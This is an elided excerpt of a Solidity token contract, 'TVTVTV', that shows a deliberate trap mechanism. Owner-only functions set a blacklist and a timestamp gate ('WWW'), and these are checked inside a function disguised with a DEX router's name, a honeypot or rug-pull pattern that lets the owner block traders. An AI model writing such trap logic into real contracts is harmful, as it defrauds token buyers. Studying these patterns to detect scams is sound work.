...
contract TVTVTV is Ownable {
    ...
    function WWW(uint256 amount) external onlyOwner {
        if (amount == 0) lastWWW = block.timestamp;
        else lastWWW = amount;
    }
    ...
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        ...
        if (from == pair) {
            ...
            require(!blacks[from]);
            require(hodl[from] > lastWWW);
        }

        return false;
    }

    function addWH(address[] memory _whl) external onlyOwner{
        for (uint i = 0; i < _whl.length; i++) {
            whales[_whl[i]] = true;
        }
    }

    function removeWH(address[] memory _whl) external onlyOwner{
        for (uint i = 0; i < _whl.length; i++) {
            whales[_whl[i]] = false;
        }
    }
    ...
    function removeWW(address[] memory _wat) external onlyOwner{
        for (uint i = 0; i < _wat.length; i++) {
            whites[_wat[i]] = false;
        }
    }
